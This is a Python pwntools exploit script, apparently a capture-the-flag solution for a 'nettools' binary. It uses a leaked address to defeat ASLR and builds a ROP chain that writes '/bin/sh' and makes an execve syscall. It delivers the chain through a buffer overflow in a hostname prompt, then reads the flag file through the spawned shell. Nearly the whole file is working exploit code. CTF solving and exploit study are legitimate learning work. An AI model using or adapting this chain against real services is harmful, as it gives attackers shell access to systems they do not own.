import os
from pwn import *

context.log_level = "error"
# p = process('./nettools')
p = remote("target", 1337)

p.recvuntil(b"leaked:")
leak = int(p.recvline(), 16)
print(hex(leak))

exec_base = leak - 0x7A03C
ret = exec_base + 0x000000000000901A


IMAGE_BASE_0 = exec_base
rebase_0 = lambda x: p64(x + IMAGE_BASE_0)

rop = b""

rop += rebase_0(0x000000000000ECAA)  # 0x000000000000a0ef: pop rax; ret;
rop += rebase_0(0x000000000007A000)
rop += rebase_0(0x0000000000020BB3)  # pop rdx; add byte ptr [rax], al ; ret
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000ECAA)  # 0x000000000000ecaa: pop rax; ret;
rop += b"/bin/sh\x00"
rop += rebase_0(0x000000000000A0EF)  # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007A000)
rop += rebase_0(
    0x000000000002B9CB
)  # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000ECAA)  # 0x000000000000ecaa: pop rax; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000A0EF)  # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007A008)
rop += rebase_0(
    0x000000000002B9CB
)  # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000A0EF)  # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007A000)
rop += rebase_0(0x0000000000009C18)  # 0x0000000000009c18: pop rsi; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000ECAA)  # 0x000000000000ecaa: pop rax; ret;
rop += p64(0x000000000000003B)
rop += rebase_0(0x0000000000025ADF)  # 0x0000000000025adf: syscall;
p.sendlineafter(b">", b"3")
p.sendlineafter(b"Hostname:", b"A" * 400 + b"\x00" * 8 + p64(ret) * 49 + rop)
p.recvline()

p.sendline(b"cat challenge/flag.txt")
output = p.recv()
print(output.decode(errors="ignore").strip())


with open("output.txt", "wb") as f:
    f.write(output)

p.close()
# p.interactive()
